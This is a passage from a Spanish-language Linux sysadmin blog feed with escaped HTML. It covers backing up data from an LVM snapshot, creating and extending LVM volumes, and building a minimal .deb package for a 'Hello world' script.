&lt;p&gt;Verificando los &lt;em&gt;logical volume&lt;/em&gt; con el comando &lt;em&gt;lvs&lt;/em&gt;, vemos que es un volumen de 100 MB, con una ocupación baja, del 0,08%. El &lt;em&gt;snapshot&lt;/em&gt; quedaría inservible si llegara a superar el 100%.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvs
  LV         VG   Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
  datos      lvm  owi-aos---   &lt;span class="m"&gt;1&lt;/span&gt;,00g
  datos-snap lvm  swi-aos--- &lt;span class="m"&gt;100&lt;/span&gt;,00m      datos  &lt;span class="m"&gt;0&lt;/span&gt;,08
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Sacando el backup&lt;/h2&gt;
&lt;p&gt;El objetivo inicial era sacar una copia de los datos, congelados en un momento concreto. Tenemos ese momento en el volumen &lt;em&gt;datos-snap&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Empezaremos montándolo en alguna carpeta cualquiera, si no lo teníamos ya (lo hemos montado en el punto anterior).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mount /dev/lvm/datos-snap /mnt/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con el volumen montado, el resto es procedimiento estándar. En este caso, vamos a sacar un fichero &lt;em&gt;.tar.gz&lt;/em&gt; con el contenido de la carpeta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# &lt;span class="nb"&gt;cd&lt;/span&gt; /mnt/
root@server:/mnt# tar cvzf /root/backup.tar.gz *
a
b
root@server:/mnt#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente vamos a limpiar el &lt;em&gt;snapshot&lt;/em&gt;, empezando por desmontar el volumen. Como estamos dentro de la carpeta no vamos a poder desmontar el volumen, así que salimos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:/mnt# &lt;span class="nb"&gt;cd&lt;/span&gt;
root@server:~# umount /mnt/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ahora que no lo tenemos montado, lo eliminamos sin problemas con las herramientas propias de &lt;strong&gt;LVM&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvremove /dev/lvm/datos-snap
Do you really want to remove active logical volume datos-snap? &lt;span class="o"&gt;[&lt;/span&gt;y/n&lt;span class="o"&gt;]&lt;/span&gt;: y
  Logical volume &lt;span class="s2"&gt;&amp;quot;datos-snap&amp;quot;&lt;/span&gt; successfully removed
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo quedará poner el fichero &lt;em&gt;backup.tar.gz&lt;/em&gt; a buen recaudo.&lt;/p&gt;</content><category term="linux"></category><category term="lvm"></category><category term="logical volume manager"></category><category term="snapshot"></category><category term="point-in-time"></category><category term="backup"></category></entry><entry><title>LVM: logical volume manager</title><link href="https://www.linuxsysadmin.ml/2016/01/lvm-logical-volume-manager.html" rel="alternate"></link><published>2016-01-18T09:00:00+01:00</published><updated>2016-01-18T09:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-01-18:/2016/01/lvm-logical-volume-manager.html</id><summary type="html">&lt;p&gt;Cuando eres un usuario medio no te complicas; particionas tu disco, a menudo usando un sistema de particionado guiado e instalas tu sistema operativo favorito. El problema es cuando las particiones se te quedan cortas. Para estos casos, se inventó una tecnología llamada &lt;em&gt;logical volume manager&lt;/em&gt;, usando sus siglas: &lt;strong&gt;LVM …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando eres un usuario medio no te complicas; particionas tu disco, a menudo usando un sistema de particionado guiado e instalas tu sistema operativo favorito. El problema es cuando las particiones se te quedan cortas. Para estos casos, se inventó una tecnología llamada &lt;em&gt;logical volume manager&lt;/em&gt;, usando sus siglas: &lt;strong&gt;LVM&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;LVM es una implementación de un administrador de volúmenes lógicos para el kernel Linux. Se escribió originalmente en 1998 por Heinz Mauelshagen, que se basó en el administrador de volúmenes de Veritas usado en sistemas HP-UX.&lt;/p&gt;
&lt;p&gt;Lo que hay que saber es que las "particiones" son ahora &lt;em&gt;logical volumes&lt;/em&gt;, que son particiones de un &lt;em&gt;volume group&lt;/em&gt;. A su vez, este &lt;em&gt;volume group&lt;/em&gt; es una agrupación de discos físicos, &lt;em&gt;physical volume&lt;/em&gt; en el argot de &lt;strong&gt;LVM&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;La ventaja de &lt;strong&gt;LVM&lt;/strong&gt; es que podemos redimensionar nuestros &lt;em&gt;logical volumes&lt;/em&gt; (siempre que el sistema de ficheros lo permita) y que podemos añadir y quitar &lt;em&gt;physical volumes&lt;/em&gt; a nuestros &lt;em&gt;volume groups&lt;/em&gt;, a efectos de incrementar su espacio disponible.&lt;/p&gt;
&lt;p&gt;Usos frecuentes para &lt;strong&gt;LVM&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dimensionado de discos en caliente&lt;/li&gt;
&lt;li&gt;Creación de particiones de espacio limitado&lt;/li&gt;
&lt;li&gt;Capacidad para crear &lt;em&gt;snapshots point-in-time&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Un ejemplo&lt;/h2&gt;
&lt;p&gt;Partimos de una máquina virtual con cualquier distribución &lt;em&gt;Linux&lt;/em&gt;, por ejemplo &lt;em&gt;Debian&lt;/em&gt;, que dispone de 2 discos adicionales dedicados para &lt;strong&gt;LVM&lt;/strong&gt;. Con uno bastaría, pero ya pongo los dos para tenerlo hecho cuando el tutorial avance.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# fdisk -l /dev/sdb

Disco /dev/sdb: &lt;span class="m"&gt;8&lt;/span&gt; GiB, &lt;span class="m"&gt;8589934592&lt;/span&gt; bytes, &lt;span class="m"&gt;16777216&lt;/span&gt; sectores
Unidades: sectores de &lt;span class="m"&gt;1&lt;/span&gt; * &lt;span class="nv"&gt;512&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;512&lt;/span&gt; bytes
Tamaño de sector &lt;span class="o"&gt;(&lt;/span&gt;lógico/físico&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;512&lt;/span&gt; bytes / &lt;span class="m"&gt;512&lt;/span&gt; bytes
Tamaño de E/S &lt;span class="o"&gt;(&lt;/span&gt;mínimo/óptimo&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;512&lt;/span&gt; bytes / &lt;span class="m"&gt;512&lt;/span&gt; bytes
root@server:~# fdisk -l /dev/sdc

Disco /dev/sdc: &lt;span class="m"&gt;4&lt;/span&gt; GiB, &lt;span class="m"&gt;4294967296&lt;/span&gt; bytes, &lt;span class="m"&gt;8388608&lt;/span&gt; sectores
Unidades: sectores de &lt;span class="m"&gt;1&lt;/span&gt; * &lt;span class="nv"&gt;512&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;512&lt;/span&gt; bytes
Tamaño de sector &lt;span class="o"&gt;(&lt;/span&gt;lógico/físico&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;512&lt;/span&gt; bytes / &lt;span class="m"&gt;512&lt;/span&gt; bytes
Tamaño de E/S &lt;span class="o"&gt;(&lt;/span&gt;mínimo/óptimo&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;512&lt;/span&gt; bytes / &lt;span class="m"&gt;512&lt;/span&gt; bytes
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Los discos que forman un &lt;em&gt;volume group&lt;/em&gt; no necesitan tener el mismo tamaño; así que con uno de 8 GB y otro de 4 GB tendremos bastante.&lt;/p&gt;
&lt;p&gt;Nos aseguramos que tenemos el paquete &lt;strong&gt;lvm2&lt;/strong&gt; instalado, y si no lo estuviera, lo instalamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install lvm2
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias       
Leyendo la información de estado... Hecho
...
Se instalarán los siguientes paquetes NUEVOS:
  dmeventd libdevmapper-event1.02.1 liblvm2cmd2.02 libreadline5 lvm2
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;5&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;1&lt;/span&gt;.530 kB de archivos.
Se utilizarán &lt;span class="m"&gt;3&lt;/span&gt;.898 kB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear un &lt;em&gt;volume group&lt;/em&gt; con 1 solo disco. Así que primero vamos a preparar &lt;em&gt;/dev/sdb&lt;/em&gt; como &lt;em&gt;physical volume&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# pvcreate /dev/sdb 
  Physical volume &lt;span class="s2"&gt;&amp;quot;/dev/sdb&amp;quot;&lt;/span&gt; successfully created
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ahora creamos un &lt;em&gt;volume group&lt;/em&gt; a partir del nuevo &lt;em&gt;physical volume&lt;/em&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# vgcreate vg1 /dev/sdb 
  /proc/devices: No entry &lt;span class="k"&gt;for&lt;/span&gt; device-mapper found
  Volume group &lt;span class="s2"&gt;&amp;quot;vg1&amp;quot;&lt;/span&gt; successfully created
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que tenemos un &lt;em&gt;volume group&lt;/em&gt; llamado &lt;strong&gt;vg1&lt;/strong&gt; y que dispone de 8 GB, todos ellos libres.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# vgs
  VG   &lt;span class="c1"&gt;#PV #LV #SN Attr   VSize VFree&lt;/span&gt;
  vg1    &lt;span class="m"&gt;1&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt; wz--n- &lt;span class="m"&gt;8&lt;/span&gt;,00g &lt;span class="m"&gt;8&lt;/span&gt;,00g
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nos gustaría que nuestros usuarios tuvieran una partición dedicada, así quedarán limitados en el espacio que pueden usar, sin molestar el resto del sistema operativo. En el argot de &lt;strong&gt;LVM&lt;/strong&gt; se trata de un &lt;em&gt;logical volume&lt;/em&gt;. Lo creamos, por ejemplo de 5 GB:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvcreate vg1 -L 5G -n users
  Logical volume &lt;span class="s2"&gt;&amp;quot;users&amp;quot;&lt;/span&gt; created
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Miramos la salida de los comandos &lt;strong&gt;lvs&lt;/strong&gt;, &lt;strong&gt;vgs&lt;/strong&gt; y &lt;strong&gt;pvs&lt;/strong&gt;: sin sorpresas. Tenemos un &lt;em&gt;logical volume&lt;/em&gt; de 5 GB, al &lt;em&gt;volume group&lt;/em&gt; le quedan 3 GB igual que al &lt;em&gt;physical volume&lt;/em&gt; subyacente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvs
  LV    VG   Attr       LSize Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
  users vg1  -wi-a----- &lt;span class="m"&gt;5&lt;/span&gt;,00g                                                    
root@server:~# vgs
  VG   &lt;span class="c1"&gt;#PV #LV #SN Attr   VSize VFree&lt;/span&gt;
  vg1    &lt;span class="m"&gt;1&lt;/span&gt;   &lt;span class="m"&gt;1&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt; wz--n- &lt;span class="m"&gt;8&lt;/span&gt;,00g &lt;span class="m"&gt;3&lt;/span&gt;,00g
root@server:~# pvs
  PV         VG   Fmt  Attr PSize PFree
  /dev/sdb   vg1  lvm2 a--  &lt;span class="m"&gt;8&lt;/span&gt;,00g &lt;span class="m"&gt;3&lt;/span&gt;,00g
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sabiendo que ahora tenemos un dispositivo nuevo de 5 GB en &lt;em&gt;/dev/vg1-users&lt;/em&gt;, lo formateamos y lo montamos como cualquier otra partición.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkfs.ext4 /dev/mapper/vg1-users 
mke2fs &lt;span class="m"&gt;1&lt;/span&gt;.42.12 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;-Aug-2014&lt;span class="o"&gt;)&lt;/span&gt;
Se está creando El sistema de ficheros con &lt;span class="m"&gt;1310720&lt;/span&gt; 4k bloques y &lt;span class="m"&gt;327680&lt;/span&gt; nodos-i

UUID del sistema de ficheros: &lt;span class="m"&gt;44788452&lt;/span&gt;-bbb4-42e3-a5f3-4a1cfa50cabb
Respaldo del superbloque guardado en los bloques: 
    &lt;span class="m"&gt;32768&lt;/span&gt;, &lt;span class="m"&gt;98304&lt;/span&gt;, &lt;span class="m"&gt;163840&lt;/span&gt;, &lt;span class="m"&gt;229376&lt;/span&gt;, &lt;span class="m"&gt;294912&lt;/span&gt;, &lt;span class="m"&gt;819200&lt;/span&gt;, &lt;span class="m"&gt;884736&lt;/span&gt;

Reservando las tablas de grupo: hecho                           
Escribiendo las tablas de nodos-i: hecho                           
Creando el fichero de transacciones &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;32768&lt;/span&gt; bloques&lt;span class="o"&gt;)&lt;/span&gt;: hecho
Escribiendo superbloques y la información contable del sistema de ficheros: hecho

root@server:~# tune2fs -m0 /dev/mapper/vg1-users 
tune2fs &lt;span class="m"&gt;1&lt;/span&gt;.42.12 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;-Aug-2014&lt;span class="o"&gt;)&lt;/span&gt;
Se pone el porcentaje de bloques reservados a &lt;span class="m"&gt;0&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; bloques&lt;span class="o"&gt;)&lt;/span&gt;
root@server:~# mount /dev/mapper/vg1-users /home/
root@server:~# df -h /home
S.ficheros            Tamaño Usados  Disp Uso% Montado en
/dev/mapper/vg1-users   &lt;span class="m"&gt;4&lt;/span&gt;,8G    10M  &lt;span class="m"&gt;4&lt;/span&gt;,8G   &lt;span class="m"&gt;1&lt;/span&gt;% /home
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tal como pasa el tiempo, vemos que los 5 GB de los usuarios se nos quedan cortos y decidimos que necesitan 10 GB. Como el &lt;em&gt;volume group&lt;/em&gt; no tiene 5 GB mas, hay que ampliarlo.&lt;/p&gt;
&lt;p&gt;Así pues, ponemos otro disco en la máquina, lo preparamos como &lt;em&gt;physical volume&lt;/em&gt; y lo asignamos al &lt;em&gt;volume group&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# pvcreate /dev/sdc
  Physical volume &lt;span class="s2"&gt;&amp;quot;/dev/sdc&amp;quot;&lt;/span&gt; successfully created
root@server:~# vgextend vg1 /dev/sdc
  Volume group &lt;span class="s2"&gt;&amp;quot;vg1&amp;quot;&lt;/span&gt; successfully extended
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así nos queda el &lt;em&gt;volume group&lt;/em&gt;: tiene 12 GB y se compone de dos &lt;em&gt;physical volumes&lt;/em&gt;, uno de 8 GB y el otro de 4 GB, aunque para nosotros, el &lt;em&gt;volume group&lt;/em&gt; es una masa uniforme de información, sin importar en que disco cae.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# vgs
  VG   &lt;span class="c1"&gt;#PV #LV #SN Attr   VSize  VFree&lt;/span&gt;
  vg1    &lt;span class="m"&gt;2&lt;/span&gt;   &lt;span class="m"&gt;1&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt; wz--n- &lt;span class="m"&gt;11&lt;/span&gt;,99g &lt;span class="m"&gt;6&lt;/span&gt;,99g
root@server:~# pvs
  PV         VG   Fmt  Attr PSize PFree
  /dev/sdb   vg1  lvm2 a--  &lt;span class="m"&gt;8&lt;/span&gt;,00g &lt;span class="m"&gt;3&lt;/span&gt;,00g
  /dev/sdc   vg1  lvm2 a--  &lt;span class="m"&gt;4&lt;/span&gt;,00g &lt;span class="m"&gt;4&lt;/span&gt;,00g
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ya estamos en disposición de reclamar los 10 GB que necesitamos, asó que &lt;strong&gt;extendemos&lt;/strong&gt; el &lt;em&gt;logical volume&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvs
  LV    VG   Attr       LSize Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
  users vg1  -wi-ao---- &lt;span class="m"&gt;5&lt;/span&gt;,00g                                                    
root@server:~# lvextend /dev/mapper/vg1-users -L 10G
  Size of logical volume vg1/users changed from &lt;span class="m"&gt;5&lt;/span&gt;,00 GiB &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1280&lt;/span&gt; extents&lt;span class="o"&gt;)&lt;/span&gt; to &lt;span class="m"&gt;10&lt;/span&gt;,00 GiB &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2560&lt;/span&gt; extents&lt;span class="o"&gt;)&lt;/span&gt;.
  Logical volume users successfully resized
root@server:~# lvs
  LV    VG   Attr       LSize  Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
  users vg1  -wi-ao---- &lt;span class="m"&gt;10&lt;/span&gt;,00g                                                    
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como curiosidad, se han absorbido 2 GB adicionales de cada &lt;em&gt;physical volume&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# pvs
  PV         VG   Fmt  Attr PSize PFree
  /dev/sdb   vg1  lvm2 a--  8,00g    0 
  /dev/sdc   vg1  lvm2 a--  4,00g 1,99g
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y un último detalle: a pesar de que la nueva "partición" dispone de 10 GB, el sistema de fichero subyacente no lo sabe, y solo tiene &lt;em&gt;inodos&lt;/em&gt; para indexar 5 GB de datos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# df -h /home/
S.ficheros            Tamaño Usados  Disp Uso% Montado en
/dev/mapper/vg1-users   &lt;span class="m"&gt;4&lt;/span&gt;,8G    10M  &lt;span class="m"&gt;4&lt;/span&gt;,8G   &lt;span class="m"&gt;1&lt;/span&gt;% /home
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por suerte para nosotros, el sistema de ficheros usado es &lt;em&gt;ext4&lt;/em&gt;, que nos permite redimensionarlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# resize2fs /dev/mapper/vg1-users 
resize2fs &lt;span class="m"&gt;1&lt;/span&gt;.42.12 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;-Aug-2014&lt;span class="o"&gt;)&lt;/span&gt;
El sistema de ficheros de /dev/mapper/vg1-users está montado en /home&lt;span class="p"&gt;;&lt;/span&gt; hace falta cambiar el tamaño en línea
&lt;span class="nv"&gt;old_desc_blocks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;, &lt;span class="nv"&gt;new_desc_blocks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
The filesystem on /dev/mapper/vg1-users is now &lt;span class="m"&gt;2621440&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;4k&lt;span class="o"&gt;)&lt;/span&gt; blocks long.

root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto, el sistema de ficheros de &lt;em&gt;/home&lt;/em&gt; ya tiene el nuevo tamaño disponible y listo para usar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# df -h /home/
S.ficheros            Tamaño Usados  Disp Uso% Montado en
/dev/mapper/vg1-users   &lt;span class="m"&gt;9&lt;/span&gt;,8G    12M  &lt;span class="m"&gt;9&lt;/span&gt;,7G   &lt;span class="m"&gt;1&lt;/span&gt;% /home
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto queda listo. Para hacer el montaje permanente, basta con añadir la línea adecuada a &lt;em&gt;/etc/fstab&lt;/em&gt;.&lt;/p&gt;</content><category term="linux"></category><category term="lvm"></category><category term="logical volume manager"></category></entry><entry><title>Empaquetando ficheros .deb</title><link href="https://www.linuxsysadmin.ml/2015/12/empaquetando-ficheros-punto-deb.html" rel="alternate"></link><published>2015-12-28T10:00:00+01:00</published><updated>2015-12-28T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-12-28:/2015/12/empaquetando-ficheros-punto-deb.html</id><summary type="html">&lt;p&gt;Una de las grandes ventajas de &lt;em&gt;linux&lt;/em&gt; es su sistema de paquetes. Con ellos es posible instalar de forma fácil un paquete de forma fácil y confiable. Hoy vamos a hacer un paquete &lt;em&gt;.deb&lt;/em&gt; como ejemplo que instale un &lt;em&gt;script&lt;/em&gt; cualquiera en la carpeta &lt;em&gt;/usr/bin/&lt;/em&gt; para su uso cotidiano …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Una de las grandes ventajas de &lt;em&gt;linux&lt;/em&gt; es su sistema de paquetes. Con ellos es posible instalar de forma fácil un paquete de forma fácil y confiable. Hoy vamos a hacer un paquete &lt;em&gt;.deb&lt;/em&gt; como ejemplo que instale un &lt;em&gt;script&lt;/em&gt; cualquiera en la carpeta &lt;em&gt;/usr/bin/&lt;/em&gt; para su uso cotidiano.&lt;/p&gt;
&lt;p&gt;Por limpieza, vamos a crear una carpeta temporal para hacer el empaquetado, desde donde vamos a ejecutar todo el resto del procedimiento.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~# mkdir workspace
root@packager:~# &lt;span class="nb"&gt;cd&lt;/span&gt; workspace/
root@packager:~/workspace# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Preparación de la estructura del paquete&lt;/h2&gt;
&lt;p&gt;Vamos a poner el &lt;em&gt;script&lt;/em&gt; que queramos empaquetar, respetando al estructura que tendrá una vez se instale el paquete. También le damos los permisos que va a tener una vez instalado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~/workspace# mkdir -p usr/bin
root@packager:~/workspace# cat usr/bin/welcome
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello world!&amp;#39;&lt;/span&gt;
root@packager:~/workspace# chmod &lt;span class="m"&gt;755&lt;/span&gt; usr/bin/welcome
root@packager:~/workspace# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Empaquetado de la carpeta de trabajo&lt;/h2&gt;
&lt;p&gt;Antes de empaquetar de acuerdo a las políticas de los paquetes &lt;em&gt;.deb&lt;/em&gt;, sea en &lt;em&gt;Debian&lt;/em&gt; o en &lt;em&gt;Ubuntu&lt;/em&gt;, se requiere de una carpeta &lt;strong&gt;DEBIAN&lt;/strong&gt; con un fichero &lt;strong&gt;control&lt;/strong&gt;, que va a contener los metadatos del paquete.&lt;/p&gt;
&lt;p&gt;Para este fichero nos podemos guiar por la &lt;a href="https://www.debian.org/doc/debian-policy/ch-controlfields.html"&gt;documentación oficial&lt;/a&gt;. Como vamos a hacer un paquete mínimo, vamos a poner solamente los campos obligatorios y uno de los opcionales, que indicarán las necesidades de nuestro script:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Obligatorios&lt;/strong&gt;:&lt;ul&gt;
&lt;li&gt;Package&lt;/li&gt;
&lt;li&gt;Version&lt;/li&gt;
&lt;li&gt;Architecture&lt;/li&gt;
&lt;li&gt;Maintainer&lt;/li&gt;
&lt;li&gt;Description&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Opcionales&lt;/strong&gt;:&lt;ul&gt;
&lt;li&gt;Depends&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Para que el &lt;em&gt;script&lt;/em&gt; pueda funcionar, hay que localizar todo aquello que pueda necesitar, y añadirlo al paquete o declarar los paquetes de los que dependa, para que se puedan instalar automáticamente si no estuvieran en el sistema destino.&lt;/p&gt;
&lt;p&gt;Concretamente, este &lt;em&gt;script&lt;/em&gt; necesita dos comandos para funcionar: &lt;strong&gt;bash&lt;/strong&gt; y &lt;strong&gt;echo&lt;/strong&gt;. Vamos a localizarlos a ver de que paquete provienen. La idea es que nuestro paquete va a necesitar todos los paquetes que contengan los comandos necesarios, sin necesidad de incorporarlos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~/workspace# which bash
/bin/bash
root@packager:~/workspace# dpkg -S /bin/bash
bash: /bin/bash
root@packager:~/workspace# which &lt;span class="nb"&gt;echo&lt;/span&gt;
/bin/echo
root@packager:~/workspace# dpkg -S /bin/echo 
coreutils: /bin/echo
root@packager:~/workspace# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De ahí deducimos que necesitamos los paquetes &lt;strong&gt;bash&lt;/strong&gt; y &lt;strong&gt;coreutils&lt;/strong&gt;, que aunque suelen venir de serie, vale la pena declararlos por si no fuera el caso. Esto es lo que va en el campo &lt;strong&gt;Depends&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Reuniendo estos datos, podemos crear el fichero &lt;strong&gt;control&lt;/strong&gt;, por ejemplo, como este:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~/workspace# mkdir -p DEBIAN
root@packager:~/workspace# cat DEBIAN/control 
Package: welcome
Version: &lt;span class="m"&gt;1&lt;/span&gt;.0-1
Architecture: all
Maintainer: Linux Sysadmin
Description: A fancy shell script
 To demonstrate how to package a .deb file
Depends: bash, coreutils
root@packager:~/workspace# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Adicionalmente, la carpeta &lt;strong&gt;DEBIAN&lt;/strong&gt; puede contener otros &lt;em&gt;scripts&lt;/em&gt;, como por ejemplo, &lt;strong&gt;preinst&lt;/strong&gt;, &lt;strong&gt;postinst&lt;/strong&gt;, &lt;strong&gt;prerm&lt;/strong&gt; y &lt;strong&gt;postrm&lt;/strong&gt;, que podrían, por ejemplo, crear los usuarios necesarios.&lt;/p&gt;
&lt;p&gt;Como último paso, vamos a invocar el comando &lt;strong&gt;dpkg-deb&lt;/strong&gt; para empaquetar la carpeta de trabajo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~/workspace# &lt;span class="nb"&gt;cd&lt;/span&gt; ..
root@packager:~# dpkg-deb --build workspace/ welcome_1.0-1_all.deb
dpkg-deb: construyendo el paquete &lt;span class="sb"&gt;`&lt;/span&gt;welcome&lt;span class="s1"&gt;&amp;#39; en `welcome_1.0-1_all.deb&amp;#39;&lt;/span&gt;.
root@packager:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Comprobación de que el paquete funciona&lt;/h2&gt;
&lt;p&gt;Vamos a comprobar que el paquete no está instalado, por ejemplo buscando el &lt;em&gt;script&lt;/em&gt; que hemos empaquetado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~# which welcome
root@packager:~# welcome 
bash: /usr/bin/welcome: No existe el fichero o el directorio
root@packager:~# 
&lt;/pre&gt;&lt;/div&gt;


